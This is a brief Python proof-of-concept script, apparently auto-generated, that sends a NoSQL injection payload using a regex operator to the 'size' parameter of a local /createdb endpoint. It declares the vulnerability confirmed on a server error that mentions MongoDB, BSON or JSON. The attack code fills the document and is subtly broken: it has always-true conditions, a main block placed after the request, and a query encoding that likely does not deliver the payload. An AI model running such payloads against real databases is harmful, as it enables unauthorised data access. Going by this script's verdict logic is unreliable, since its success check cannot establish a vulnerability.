# NoSQL Injection Vulnerability Proof of Concept
# Target: /createdb
# Method: GET
# Parameter: size

import requests

url = "http://localhost:5000/createdb"

# NoSQL Injection POC
payload = {"$regex": ".*"}

if "GET" == "GET":
    params = {"size": payload} if "size" else {}
    response = requests.get(url, params=params)
else:
    data = {"size": payload} if "size" else {}
    response = requests.post(url, json=data)

print(f"Status: {response.status_code}")
print(f"Response: {response.text[:200]}...")

# Check for NoSQL errors in response
if response.status_code == 500 and any(error in response.text.lower() for error in ["mongodb", "bson", "json"]):
    print("✅ NoSQL Injection vulnerability confirmed!")

if __name__ == "__main__":
    print("🔍 Running NoSQL Injection vulnerability test...")
    print("\n📋 Check the response for vulnerability indicators!")

